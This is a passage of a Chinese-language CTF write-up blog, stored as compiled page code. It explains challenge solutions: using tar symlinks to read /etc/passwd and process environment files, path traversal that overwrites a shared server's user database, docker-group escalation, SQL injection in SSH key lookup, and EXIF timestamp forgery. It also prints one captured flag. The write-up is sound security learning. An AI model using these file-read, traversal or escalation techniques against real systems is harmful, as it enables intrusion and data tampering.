tararchive"}),"\n",(0,s.jsx)(n.p,{children:"\u86ee\u597d\u73a9\u7684\u4e00\u9053\u9898\u3002\u6700\u540e\u4e00\u6b65\u975e\u9884\u671f\u5730\u7ed5\u8fc7\u4e86\u4e00\u4e2a\u731c\uff0c\u611f\u89c9\u8bf4\u4e0d\u5b9a\u53ef\u4ee5RCE\u3002\u4e0d\u8fc7\u6ca1\u6709\u90a3\u4e48\u53bb\u505a"}),"\n",(0,s.jsxs)(n.p,{children:["\u8fd9\u4e2a\u9898\u9996\u5148\u9700\u8981\u767b\u5f55\u3002\u63a8\u6d4b\u767b\u5f55\u53ea\u662f\u5206\u79bb\u7528\u6237\u7684\u624b\u6bb5\uff08\u53c8\u662f\u5171\u4eabinstance\uff09\uff0c\u672c\u8eab\u548c\u9898\u76ee\u65e0\u5173\u3002\u767b\u5f55\u540e\u662f\u4e00\u4e2a\u6587\u4ef6\u7ba1\u7406\u754c\u9762\uff0c\u53ef\u4ee5\u4e0a\u4f20\u6587\u4ef6\uff0c\u770b\u5df2\u4e0a\u4f20\u6587\u4ef6\u5217\u8868\uff0c\u4e0b\u8f7d\u6587\u4ef6\u3002devtools\u6293\u5305\u4f1a\u53d1\u73b0\u4e0a\u4f20\u7684\u662f\u67d0\u79cd\u4e8c\u8fdb\u5236\u683c\u5f0f\uff0c\u62ff\u4e0b\u6765\u770b\u683c\u5f0f\u4f1a\u53d1\u73b0\u662f",(0,s.jsx)(n.code,{children:".tar.gz"}),"\uff0c\u7ed3\u5408JS\u9006\u5411\uff0c\u770b\u6765\u4e0a\u4f20\u8fc7\u7a0b\u662f\u5728\u7f51\u9875\u7aefJS\u628a\u6587\u4ef6\u6253\u5305\u5230gzip\u91cc\u7136\u540e\u4e0a\u4f20\u7684\uff0c\u6211\u4eec\u5f53\u7136\u53ef\u4ee5\u7ed5\u8fc7\u8fd9\u4e2a\u8fc7\u7a0b\u76f4\u63a5\u7528API\u4e0a\u4f20gzip\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u65e2\u7136\u662fgzip\u6253\u5305\u89e3\u538b\u8fc7\u7a0b\uff0c\u90a3\u9996\u5148\u8981\u770b\u7684\u5c31\u662f\u80fd\u4e0d\u80fd\u6253\u8f6f\u94fe\u63a5\u8fdb\u53bb\u3002\u5728",(0,s.jsx)(n.code,{children:"tar"}),"\u4e2d\u52a0",(0,s.jsx)(n.code,{children:"P"}),"\u53c2\u6570\u53ef\u4ee5\u628a\u8f6f\u94fe\u63a5\u76f4\u63a5\u6253\u8fdb\u53bb\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u8fd9\u4e2a\u65b9\u6cd5\u62ff\u5230",(0,s.jsx)(n.code,{children:"/etc/passwd"}),"\uff0c\u4e5f\u5c31\u662f\u8bf4\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u8fbe\u6210\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u4f46\u5176\u5b9e\u63a5\u4e0b\u6765\u624d\u662f\u91cd\u5934\u620f\uff0c\u56e0\u4e3a\u6211\u4eec\u4e0d\u77e5\u9053flag\u5728\u54ea\uff0c\u9700\u8981\u5728\u670d\u52a1\u5668\u4e0a\u53d6\u8bc1\u3002\u9996\u5148\u62ff\u4e0b\u6765",(0,s.jsx)(n.code,{children:"/proc/self/cmdline"}),"\u548c",(0,s.jsx)(n.code,{children:"/proc/self/environ"}),"\uff0c\u53ef\u4ee5\u77e5\u9053\u670d\u52a1\u5668\u662fPython Sanic Server\uff0c\u5e76\u4e14\u662f\u4ee5ROOT\u8eab\u4efd\u8fd0\u884c\u7684\u3002\u4e0d\u8fc7\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u81ea\u5df1\u7684\u8fdb\u7a0b\u662f\u5b50\u8fdb\u7a0b\uff0c\u6240\u4ee5\u8fd8\u8981\u770b\u4e00\u773c",(0,s.jsx)(n.code,{children:"status"}),"\uff0c\u5c1d\u8bd5\u62ff\u4e00\u4e0b"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-sh",children:"# child process\n/usr/local/bin/python -c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=6, pipe_handle=20)  --multiprocessing-fork\n# parent process\n/usr/local/bin/python /usr/local/bin/sanic server -H 0.0.0.0\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u7136\u540e\u6211\u4eec\u5c31\u53d1\u73b0\u95ee\u9898\u4e86\uff0c\u6e90\u7801\u5462\uff1fsanic\u663e\u7136\u662f\u4e2a\u5305\uff0c\u6211\u4eec\u8fd8\u662f\u4e0d\u77e5\u9053\u6e90\u7801\u5728\u54ea\u3002\u7ed3\u5408",(0,s.jsx)(n.code,{children:"sanic"}),"\u6587\u6863\uff0c\u6211\u4eec\u7ec8\u4e8e\u610f\u8bc6\u5230\u6e90\u7801\u5e94\u8be5\u548c",(0,s.jsx)(n.code,{children:"sanic"}),"\u91cc\u4f20\u7684\u53c2\u6570\u540d\u4e00\u6837\u662f",(0,s.jsx)(n.code,{children:"server.py"}),"\uff0c\u8003\u8651\u5230\u6211\u4eec\u4e0d\u77e5\u9053\u7edd\u5bf9\u8def\u5f84\uff0c\u90a3\u5c31",(0,s.jsx)(n.code,{children:"/proc/1/cwd/server.py"}),"\uff0c\u786e\u5b9e\u62ff\u5230\u4e86\u6e90\u7801\u3002\uff081\u662f\u7236\u8fdb\u7a0bPID\uff09\u3002\u5206\u6790\u6e90\u7801\u6211\u4eec\u987a\u4fbf\u628a\u5f15\u7528\u7684\u51e0\u4e2a\u672c\u5730\u6a21\u5757",(0,s.jsx)(n.code,{children:"util.py"}),", ",(0,s.jsx)(n.code,{children:"auth.py"}),"\u4e00\u8d77\u62ff\u4e0b\u6765\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u7136\u540e\u5f00\u59cb\u5206\u6790\u6e90\u7801\u3002\u574f\u6d88\u606f\u662f\uff0c\u6211\u4eec\u8fd8\u662f\u4e0d\u77e5\u9053flag\u5728\u54ea\u3002\u597d\u6d88\u606f\u662f\uff0c\u6211\u4eec\u53d1\u73b0\u670d\u52a1\u5668\u6570\u636e\u5e93\u5728\u54ea\u4e86\uff0c\u663e\u7136\u9898\u76ee\u7528\u4e86",(0,s.jsx)(n.code,{children:"aiosqlite"}),"\uff0c\u6570\u636e\u5e93\u5c31\u5728",(0,s.jsx)(n.code,{children:"users.db"}),"\u3002\u540c\u65f6\uff0c\u6211\u4eec\u77e5\u9053\u4e86\u7528\u6237\u6ce8\u518c\u65f6\u4f1a\u521d\u59cb\u5316\u4e00\u4e2a\u4e2a\u4eba\u6587\u4ef6\u5939",(0,s.jsx)(n.code,{children:"files/<random-hash>/"}),"\uff0c\u6240\u6709\u6587\u4ef6\u90fd\u4f1a\u5728\u8fd9\u91cc\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u4e0b\u4e00\u6b65\u5c31\u662f\u628a\u6570\u636e\u5e93\u62ff\u4e0b\u6765\uff0c\u7528DB Browser\u770b\u4e00\u773c\uff0c\u53d1\u73b0\u8fd9\u4e2a\u6570\u636e\u5e93\u53ea\u6709\u4e09\u5217\uff1a\u767b\u5f55\u540d\uff0c\u5bc6\u7801hash\uff0c\u4e2a\u4eba\u6587\u4ef6\u5939\u76ee\u5f55\u3002\u7136\u540egzip\u89e3\u538b\u8fd8\u6709\u4e2a\u7279\u6027\uff0c\u5c31\u662f\u5f53\u6253\u5305\u8fdb\u53bb\u7684\u8def\u5f84\u5305\u542b",(0,s.jsx)(n.code,{children:"../../"}),"\u65f6\uff0c\u89e3\u538b\u65f6\u4e5f\u4f1a\u5c0a\u91cd\u8fd9\u4e2a\u8def\u5f84\uff0c\u5bfc\u81f4\u89e3\u538b\u51fa\u6765\u7684\u6587\u4ef6\u7a7f\u8d8a\u5230\u7236\u7ea7\u76ee\u5f55\u53bb\u3002\u4e3a\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4f2a\u9020\u4e00\u4e2a\u6570\u636e\u5e93\uff0c\u653e\u5728\u672c\u5730\u7684",(0,s.jsx)(n.code,{children:"../../users.db"}),"\u4f4d\u7f6e\uff0c\u7136\u540e\u6253\u8fdbgzip\u4e0a\u4f20\uff0c\u4e4b\u540e\u670d\u52a1\u5668\u89e3\u538b\u65f6\u5c31\u4f1a\u8986\u76d6\u539f\u672c\u7684",(0,s.jsx)(n.code,{children:"users.db"}),"\u3002\u8bf4\u5b9e\u8bdd\u6211\u4e5f\u641e\u4e0d\u6e05\u695a\u8fd9\u4e2a\u8def\u5f84\u7a7f\u8d8a\u89e3\u538b\u662f\u4e0d\u662f\u9884\u671f\u7684\uff0c\u56e0\u4e3a\u5982\u679c\u80fd\u731c\u5230flag\u4f4d\u7f6e\u53ef\u4ee5\u4e0d\u9700\u8981\u8fd9\u4e2a\uff0c\u800c\u4e14\u8fd9\u4e2a\u771f\u7684\u53ef\u4ee5\u7528\u6765\u5e72\u6270\u5176\u4ed6\u9009\u624b\u6bd4\u8d5b\u3002\u672c\u7740\u516c\u5e73\u7ade\u6280\u7684\u539f\u5219\uff0c\u6211\u53ea\u7528insert\u52a0\u4e86\u4e00\u6761\uff0c\u6ca1\u6709\u5220\u5e93\u3002\u597d\u5728\u6e90\u7801\u91cc\u76f4\u63a5\u63d0\u4f9b\u4e86\u5bc6\u7801hash\u7684SALT\uff0c\u6211\u4eec\u53ef\u4ee5\u6210\u529f\u767b\u5f55\uff0c\u5e76\u4e14\u628a\u81ea\u5df1\u7684\u6587\u4ef6\u76ee\u5f55\u653e\u5728\u4efb\u610f\u4f4d\u7f6e\uff0c\u76f8\u5f53\u4e8e\u53ef\u4ee5\u5bf9\u4efb\u610f\u76ee\u5f55",(0,s.jsx)(n.code,{children:"ls"}),"\u3002\u6700\u7ec8\u6211\u4eec\u4f1a\u53d1\u73b0\u9879\u76ee\u6e90\u7801\u4f4d\u4e8e",(0,s.jsx)(n.code,{children:"/chall"}),"\uff0c\u800c",(0,s.jsx)(n.code,{children:"flag"}),"\u5c31\u771f\u7684\u53ea\u5728",(0,s.jsx)(n.code,{children:"/chall/flag"}),"\u3002\u6240\u4ee5\u5982\u679c\u80fd\u731c\u5230flag\u4f4d\u7f6e\u5c31\u4e0d\u7528\u7206\u6570\u636e\u5e93\u4e86\uff0c\u4e0d\u8fc7\u8bf4\u5230\u5e95\uff0c\u80fd\u53d6\u8bc1\u4e3a\u4ec0\u4e48\u8981\u731c\u5462\uff1f"]}),"\n",(0,s.jsxs)(n.p,{children:["\u63a5\u4e0b\u6765\u80fd\u4e0d\u80fd\u7528\u8fd9\u4e2aRCE\u5462\uff1f\u81f3\u5c11\u6211\u89c9\u5f97\u53ef\u4ee5\u628a",(0,s.jsx)(n.code,{children:"server.py"}),"\u6e90\u7801\u6362\u6389\uff0c\u6216\u8005\u628a\u4e00\u4e9b\u5e93\u6362\u6389\u3002\u8003\u8651\u5230\u8fd9\u4e2a\u53ef\u80fd\u592a\u8fc7\u5206\u4e86\u6211\u5c31\u6ca1\u5f04\u3002"]}),"\n",(0,s.jsx)(n.h2,{id:"misc---gitlabrunner-incomplete",children:"misc - gitlabrunner (incomplete)"}),"\n",(0,s.jsx)(n.p,{children:"\u6709\u70b9\u610f\u601d\u7684\u9898\uff0c\u4f46\u662f\u6700\u540e\u6ca1\u53bb\u505a\u3002\u8fd9\u4e2a\u9898\u7ed9\u4e86\u4e00\u4e2assh\uff0c\u8fdb\u53bb\u540e\u662f\u4e00\u4e2aubuntu docker\u955c\u50cf\u3002\u6211\u4eec\u4f1a\u53d1\u73b0\u81ea\u5df1\u662fdocker\u7ec4\u7684\uff0c\u5e76\u4e14\u6709\u5916\u7f51\uff0c\u90a3docker\u7ec4\u5c31\u7b49\u4e8eroot\uff0c\u6211\u4eec\u53ef\u4ee5\u6302\u8f7d\u4efb\u610f\u76ee\u5f55\u8fdbdocker\u8fbe\u6210\u4efb\u610f\u6587\u4ef6\u8d8a\u6743\u8bfb\u53d6\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u8fdb\u53bb\u540e\uff0c\u7a0d\u5fae\u8fdb\u884c\u4e00\u4e9b\u53d6\u8bc1(\u770bjournalctl)\uff0c\u4f1a\u53d1\u73b0\u540e\u53f0\u8fd0\u884c\u7740\u4e00\u4e2agitlab runner\u3002\u53ef\u4ee5\u62ff\u5230\u914d\u7f6e\u6587\u4ef6\u548csecret token\uff0c\u4f3c\u4e4e\u6bcf\u9694\u5341\u5206\u949f\u8fd9\u4e2arunner\u5c31\u4f1a\u8fdb\u884c\u4e00\u4e2abuild\u4efb\u52a1\u3002\u5982\u679c\u6211\u4eec\u80fd\u62e6\u622a\u8fd9\u4e2abuild\u4efb\u52a1\u6216\u8bb8\u53ef\u4ee5\u5f97\u5230\u8fdb\u4e00\u6b65\u4fe1\u606f\uff0cgitlab\u5b98\u65b9\u4e5f\u63d0\u5230\u5982\u679c\u6cc4\u9732token\u53ef\u80fd\u53ef\u4ee5\u5bfc\u81f4\u4efb\u52a1\u514b\u9686\u653b\u51fb\u3002\u4e0d\u8fc7\u8fd9\u8981\u6c42\u6211\u672c\u5730\u4e5f\u8dd1\u4e00\u4e2arunner\uff0c\u800c\u4e14\u6211\u591a\u5c11\u4e0d\u592a\u559c\u6b22\u522b\u4eba\u4ee3\u7801\u4e0d\u77e5\u60c5\u5730\u8fd0\u884c\u5728\u81ea\u5df1\u7535\u8111\u7684\u611f\u89c9\uff0c\u5c31\u6ca1\u53bb\u642d\u73af\u5883\u3002"}),"\n",(0,s.jsx)(n.h2,{id:"rev---ssh-incomplete",children:"rev - ssh (incomplete)"}),"\n",(0,s.jsxs)(n.p,{children:["\u82b1\u4e86\u4e0d\u5c11\u7cbe\u529b\u4f46\u662f\u6ca1\u505a\u51fa\u6765\uff0c\u6211get\u5230IDEA\u4e86\u3002\u8fd9\u4e2a\u9898\u60f3\u8ba9\u6211\u4eec\u516c\u94a5\u767b\u5f55\u4e00\u4e2aSSH Server\uff0c\u7ed9\u4e86\u4e00\u4e2a",(0,s.jsx)(n.code,{children:"authlookup"}),"\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u3002\u9898\u5e72\u91cc\u63d0\u793a\u6211\u4eec\u601d\u8003github\u8fd9\u79cd\uff0c\u90fd\u662f\u767b\u5f55git\u7528\u6237\uff0c\u4f46\u662f\u4e0d\u540c\u7528\u6237\u53ef\u4ee5\u62ff\u5230\u4e0d\u540c\u6743\u9650\u7684\u673a\u5236\u662f\u600e\u4e48\u5b9e\u73b0\u7684\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u9006\u5411",(0,s.jsx)(n.code,{children:"authlookup"}),"\uff0c\u5b83\u5b9e\u73b0\u4e86\u7c7b\u4f3c\u7684\u673a\u5236\u3002\u5b83\u4f1a\u4f20\u5165\u4e00\u4e2a\u516c\u94a5\uff0c\u7136\u540e\u5224\u65ad\u516c\u94a5\u7c7b\u578b\uff0c\u63d0\u53d6\u516c\u94a5\u53c2\u6570\uff08\u6bd4\u5982\u5bf9RSA\u516c\u94a5\uff0c\u5c31\u662fN\u548ce\uff09\uff0c\u7136\u540e\u653e\u5230SQL\u6570\u636e\u5e93\u91cc\u67e5\u8be2\u662f\u5426\u6709\u8fd9\u6837\u7684\u4e00\u6761N,e\u8bb0\u5f55\uff0c\u5982\u679c\u6709\u5c31\u6210\u529f\u767b\u5f55\u3002\u4f46\u53ef\u60dc\u8fd9\u4e2a",(0,s.jsx)(n.code,{children:"authlookup"}),"\u662f\u53ef\u4ee5SQL\u6ce8\u5165\u7684\u3002"]}),"\n",(0,s.jsx)(n.p,{children:"\u7136\u800c\u8fd9\u4e2a\u9898\u96be\u70b9\u5728\u4e8e\u6211\u4eec\u4e0d\u53ea\u8981bypass\u516c\u94a5\u8ba4\u8bc1\uff0c\u8fd8\u8981\u5229\u7528OpenSSH\u6765\u5efa\u7acb\u7a33\u5b9a\u8fde\u63a5\u3002SSH\u63d0\u4f9b\u7684\u53c2\u6570\u662f\u79c1\u94a5\uff0c\u79c1\u94a5\u662f\u5305\u542b\u516c\u94a5\u5185\u5bb9\u7684\u3002\u56e0\u6b64\u5408\u7406\u7684\u8bbe\u60f3\u662f\u6784\u9020\u4e00\u4e2a\u539f\u59cb\u7684\u79c1\u94a5-\u516c\u94a5\u5bf9\uff0c\u4f46\u628a\u516c\u94a5\u90e8\u5206\u90fd\u7be1\u6539\u6210SQL\u6ce8\u5165\u5185\u5bb9\uff0c\u8ba9\u670d\u52a1\u5668\u76f4\u63a5\u8fd4\u56de\u539f\u672c\u7684\u516c\u94a5\u3002\u601d\u8def\u975e\u5e38\u5408\u7406\uff0c\u4f46\u662f\u6211\u65e0\u8bba\u5982\u4f55\u90fd\u8c03\u8bd5\u4e0d\u901a\u8fc7\uff0c\u800c\u4e14\u5f88\u96be\u5224\u65ad\u95ee\u9898\u51fa\u5728\u54ea\u91cc\u3002\u5df2\u77e5\u7684\u4e00\u4e9b\u95ee\u9898\u5305\u62ec\uff0c\u516c\u94a5N\u5f97\u8d85\u8fc71024\u4f4d\u5426\u5219\u4f1a\u56e0\u4e3a\u4e0d\u5b89\u5168\u62a5\u9519\uff0c\u9664\u6b64\u4ee5\u5916\u53ef\u80fd\u8fd8\u6709\u522b\u7684\u5404\u79cd\u9a8c\u8bc1\uff08\u6bd4\u5982p\u548cq\u7684\u9a8c\u8bc1\u7b49\u7b49\uff09\u3002\u4e3a\u6b64\u6211\u8fd8\u7814\u7a76\u4e86\u4e0bSSH\u79c1\u94a5\u683c\u5f0f\uff0c\u4e86\u89e3\u4e86OpenSSH\u548cOpenSSL\u7528\u7684RSA\u516c\u94a5\u5176\u5b9e\u683c\u5f0f\u8fd8\u4e0d\u4e00\u6837\uff0c\u4f46\u5b9e\u9645\u4e0a\u7528pycrypto\u53ef\u4ee5\u76f4\u63a5\u751f\u6210\u79c1\u94a5\uff0c\u66f4\u65b9\u4fbf\u4e00\u70b9\u3002"}),"\n",(0,s.jsx)(n.h2,{id:"geekctf-2024",children:"GeekCTF 2024"}),"\n",(0,s.jsx)(n.h2,{id:"misc---boys-bullet",children:"misc - Boy's Bullet"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"It was the spring of 2024 when a boy born in millennium picked up a real gun on the road. Because he was young, ignorant and fearless, he pulled the trigger. No one died and no one was injured. He thought he had fired a blank shot. Fourteen years later, he heard a faint sound of wind behind him while walking on the road. He stopped and turned around. The bullet hit him between the eyebrows."}),"\n",(0,s.jsxs)(n.p,{children:["curl ",(0,s.jsx)(n.a,{href:"http://chall.geekctf.geekcon.top:10038",children:"http://chall.geekctf.geekcon.top:10038"})]}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:"\u4e00\u5f00\u59cb\u8fd8\u6ca1\u610f\u8bc6\u5230\uff0c2024+14=2038\uff0c\u6240\u4ee5\u6211\u4ee5\u4e3a\u8fd9\u4e2a\u662f\u60f3\u8bf432\u4f4dUnix\u7cfb\u7edf\u6ea2\u51fa\u95ee\u9898\uff0c\u4f46\u5176\u5b9e\u8fd8\u4e0d\u662f\u3002"}),"\n",(0,s.jsxs)(n.p,{children:["\u8fd9\u4e2a\u9898\u7ed9\u73af\u5883\u7684\u65b9\u5f0f\u5f88\u7279\u522b\uff0c\u7ed9\u7684\u662fcurl\uff0c\u5f53\u7136\u8fde\u4e0a\u4e4b\u540e\u5b83\u4f1a\u9646\u7eed\u8ba9\u6211\u4eec\u7528",(0,s.jsx)(n.code,{children:"-T"}),"\u53c2\u6570\u4f20\u6587\u4ef6\uff0c\u4f20\u7684\u6587\u4ef6\u5fc5\u987b\u662f",(0,s.jsx)(n.code,{children:"jpeg"}),"\u6587\u4ef6\uff08jpg\u6269\u5c55\u540d\u8fd8\u4e0d\u884c\uff09\uff0c\u7136\u540e\u4f1a\u544a\u8bc9\u6211\u4eec\u6587\u4ef6\u7684\u65f6\u95f4\u6233\u662f\u591a\u5c11\u5e74\u800c\u4e0d\u662f2038\u5e74\u3002"]}),"\n",(0,s.jsx)(n.p,{children:"\u4e8e\u662f\u6211\u9996\u5148\u60f3\u5230\u7684\u662f\u6539\u6587\u4ef6\u4fee\u6539\u65f6\u95f4\u548c\u521b\u5efa\u65f6\u95f4\uff08\u521b\u5efa\u65f6\u95f4\u65e0\u6cd5\u5728WSL\u4e0b\u6539\uff0c\u6211\u5728Windows\u4e0b\u7528win32api\u6539\u7684\uff09\uff0c\u4f46\u6ca1\u7528\uff0c\u6587\u4ef6\u8fd8\u662f\u8bb0\u5f55\u4e86\u6211\u7684\u771f\u5b9e\u65f6\u95f4\u3002"}),"\n",(0,s.jsx)(n.p,{children:"\u5176\u5b9e\u8fd9\u65f6\u6211\u5c31\u8be5\u60f3\u5230\u4e0d\u5bf9\u4e86\uff0c\u56e0\u4e3aunix\u65f6\u95f4\u6233\u6309\u8bf4\u662f\u4e0d\u4f1a\u51fa\u73b0\u5728\u7f51\u7edc\u6587\u4ef6\u4f20\u8f93\u4e2d\u7684\uff0c\u6240\u4ee5\u8fd9\u8981\u4e48\u662f\u5728\u8bf7\u6c42\u5934\u91cc\uff0c\u8981\u4e48\u662f\u5728\u6587\u4ef6\u5185\u90e8\uff08\u7279\u522b\u56e0\u4e3a\u672c\u9898\u6307\u5b9ajpeg\u683c\u5f0f\uff0c\u5728\u6587\u4ef6\u5185\u90e8\u53ef\u80fd\u6027\u5f88\u9ad8\uff09"}),"\n",(0,s.jsxs)(n.p,{children:["\u5982\u679c\u770b\u8bf7\u6c42\u5934\uff0ccurl\u53ef\u4ee5\u76f4\u63a5\u5e26verbose\u53c2\u6570\uff0c\u4f1a\u770b\u5230",(0,s.jsx)(n.code,{children:"-T"}),"\u4e0a\u4f20\u6587\u4ef6\u662f\u7528",(0,s.jsx)(n.code,{children:"PUT"}),"\uff0c\u4f46\u597d\u50cf\u4e5f\u6ca1\u4ec0\u4e48\u7279\u522b\u7684\u4e1c\u897f\u3002\u7136\u540e\u6211\u5728\u4e0a\u4f20\u6587\u4ef6\u65f6\uff0c\u628a\u4e00\u4e2apng\u56fe\u7247\u6269\u5c55\u540d\u6539\u6210",(0,s.jsx)(n.code,{children:"jpeg"}),"\u4e0a\u4f20\u4e86\uff0c\u7ed3\u679c\u670d\u52a1\u5668\u8fd4\u56de\u4e86\u62a5\u9519\u4fe1\u606f\u3002\u4fe1\u606f\u672c\u8eab\u662fflask debug\u6a21\u5f0f\uff0c\u5185\u5d4c\u4e86\u5f88\u591aHTML\uff0c\u4e0d\u8fc7\u6211\u4eec\u8fd8\u662f\u80fd\u627e\u5230\u6cc4\u9732\u7684\u6e90\u7801\u3002"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:'@app.route("/<filename>", methods=["PUT"])\ndef upload(filename):\n    if not filename.endswith("jpeg"):\n        return "Photo must be in JPEG format\\n"\n    image = Image(request.data)\n    try:\n        # fetch timestamp from exif data\n        exif_time = datetime.fromisoformat(image["datetime"].replace(":", "-", 2))\n        exif_timestamp = c_int(int(exif_time.timestamp()))\n        # fetch current timestamp\n'})}),"\n",(0,s.jsxs)(n.p,{children:["\u7a0d\u5fae\u8c03\u7814\u4e00\u4e0b\uff0c\u6211\u4eec\u5b9a\u4f4d\u5230\u65f6\u95f4\u662f\u6765\u81ea",(0,s.jsx)(n.code,{children:"exif"}),"\u8fd9\u4e2a\u5305\uff0c\u5e76\u4e14\u8bbf\u95ee\u7684\u662f",(0,s.jsx)(n.code,{children:"datetime"}),"\u8fd9\u4e2a\u5c5e\u6027\u3002\u6211\u4eec\u76f4\u63a5\u8bfb\u51fa\u539f\u59cbJPEG\u6570\u636e\u540e\uff0c\u7528",(0,s.jsx)(n.code,{children:"exif"}),"\u4fee\u6539\u8fd9\u4e2a\u5c5e\u6027\u518d\u4e0a\u4f20\uff0c\u5c31\u53ef\u4ee5\u62ff\u5230flag\u3002"]}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.code,{children:"flag{47_7h15_m0m3n7_3duc4710n_h45_c0mp1373d_4_72u1y_c1053d_100p}"})}),"\n"]}),"\n",(0,s.jsx)(n.h2,{id:"misc---f-and-r",children:"misc - f and r"}),"\n",(0,s.jsxs)(n.p,{children:["\u8fd9\u4e2a\u9898\u7ed9\u4e86\u4e00\u4e2aWindows KB\u66f4\u65b0\u5b89\u88c5\u5305\uff08",(0,s.jsx)(n.code,{children:"windows10.0-kb114514-x64.msu"}),"\uff09\uff0c\u7b2c\u4e00\u6b21\u73a9\u5b89\u88c5\u5305\uff0c\u4e86\u89e3\u4e86\u4e0d\u5c11\u77e5\u8bc6\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u9996\u5148\u6839\u636e",(0,s.jsx)(n.a,{href:"https://support.microsoft.com/en-us/topic/description-of-the-windows-update-standalone-installer-in-windows-799ba3df-ec7e-b05e-ee13-1cdae8f23b19",children:"\u5fae\u8f6f\u5b98\u65b9\u6559\u7a0b"}),"\uff0c\u7528",(0,s.jsx)(n.code,{children:"expand -f:*"}),"\u547d\u4ee4\u628a",(0,s.jsx)(n.code,{children:"msu"}),"\u89e3\u5305\uff0c\u5176\u4e2d",(0,s.jsx)(n.code,{children:".cab"}),"\u6587\u4ef6\u8fd8\u53ef\u4ee5\u7ee7\u7eed\u89e3\u5305\u3002\u76f4\u5230\u6700\u540e\u5728",(0,s.jsx)(n.code,{children:"Cab_for_KB114514_PSFX.cab"}),"\u4e2d\u89e3\u5305\u51fa\u4e86",(0,s.jsx)(n.code,{children:"amd64_curl_0o0o0o0o0o0o0o0_10.0.19041.9999_none_0o0o0o0o0o0o0o0"}),"\u8fd9\u4e2a\u6587\u4ef6\u5939\uff0c\u91cc\u9762\u5305\u542b",(0,s.jsx)(n.code,{children:"f/curl.exe"}),"\u548c",(0,s.jsx)(n.code,{children:"r/curl.exe"}),"\uff0c\u770b\u6765\u8fd9\u662f\u6211\u4eec\u8981\u7684\u4e1c\u897f\u3002\u4e0d\u8fc7\u8fd9\u4e24\u4e2aexe\u90fd\u662f\u4e8c\u8fdb\u5236\u4e71\u7801\u3002"]}),"\n",(0,s.jsxs)(n.p,{children:["\u63a5\u4e0b\u6765\u8c03\u7814Windows\u66f4\u65b0\u673a\u5236\uff0c\u6211\u4eec\u5f88\u5feb\u5c31\u77e5\u9053\u8fd9\u4e9b\u662f",(0,s.jsx)(n.a,{href:"https://learn.microsoft.com/en-us/windows/deployment/update/psfxwhitepaper",children:"PSFX\u5dee\u5206\u66f4\u65b0"}),"\uff0cr\u6587\u4ef6\u53ef\u4ee5\u8fd8\u539f\u5230\u4e0a\u4e00\u4e2a\u7248\u672c\uff0cf\u6587\u4ef6\u5219\u662f\u66f4\u65b0\u5230\u4e0b\u4e2a\u7248\u672c\uff0c\u53ea\u8bb0\u5f55\u53d1\u751f\u53d8\u5316\u7684\u90e8\u5206\u3002\u540c\u65f6\u6211\u8fd8\u627e\u5230\u4e86",(0,s.jsx)(n.a,{href:"https://wumb0.in/extracting-and-diffing-ms-patches-in-2020.html",children:"wumb0\u7684writeup"}),"\uff0c\u975e\u5e38\u8be6\u7ec6\u8bb2\u89e3\u4e86\u5dee\u5206\u66f4\u65b0\u7684\u539f\u7406\uff0c\u8fd8\u9644\u5e26\u4e86\u8f6c\u6362\u4ee3\u7801\uff08\u8bf4\u5b9e\u8bdd\u6211\u81ea\u5df1\u53bb\u8c03\u7814API\u8fd8\u771f\u4e0d\u4e00\u5b9a\u80fd\u5199\u51fa\u8fd9\u4e2a\u6765\uff09"]}),"\n",(0,s.jsxs)(n.p,{children:["\u6709\u73b0\u6210\u5de5\u5177\u5c31\u7b80\u5355\u4e86\u3002\u9996\u5148\u6211\u4eec\u8981\u62ff\u4e00\u4e2a\u539f\u59cb\u7684",(0,s.jsx)(n.code,{children:"C:\\Windows\\System32\\curl.exe"}),"\u6587\u4ef6\u3002\u6ce8\u610f\u5230\u89e3\u5305\u8fc7\u7a0b\u4e2d\u4e00\u4e9b\u8bf4\u660e\u6587\u4ef6\u63d0\u5230\u8fd9\u4e2apatch\u662f",(0,s.jsx)(n.code,{children:"Windows 10 10.0.19041.1613"}),"\u7684\uff0c\u6211\u4e5f\u627e\u4e86\u4e00\u53f0\u8fd0\u884c\u4e86\u5f88\u4e45\u7684Win10\u673a\u5668\uff0c\u62ff\u5230\u4e86",(0,s.jsx)(n.code,{children:"curl.exe"}),"\u3002\u4f46\u540c\u65f6\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u662f22H2\u66f4\u65b0\u8fc7\u7684\uff0c\u6211\u4eec\u6700\u597d\u8fd8\u539f\u5230\u4ee5\u524d\u7684\u7248\u672c\uff0c\u4e8e\u662f\u6211\u5728",(0,s.jsx)(n.code,{children:"C:\\Windows\\WinSxS"}),"\u76ee\u5f55\u4e0b\u641c\u7d22",(0,s.jsx)(n.code,{children:"curl"}),"\uff0c\u627e\u5230"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"C:\\Windows\\WinSxS\\amd64_curl_31bf3856ad364e35_10.0.19041.3693_none_f3098ce6d279979c\\curl.exe\nC:\\Windows\\WinSxS\\amd64_curl_31bf3856ad364e35_10.0.19041.3693_none_f3098ce6d279979c\\f\\curl.exe\nC:\\Windows\\WinSxS\\amd64_curl_31bf3856ad364e35_10.0.19041.3693_none_f3098ce6d279979c\\r\\curl.exe\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u8fd9\u4e09\u4e2a\u6587\u4ef6\uff0c\u65e2\u7136\u8fd9\u662f\u552f\u4e00\u7684\u66f4\u65b0\u90a3\u6211\u4eec\u5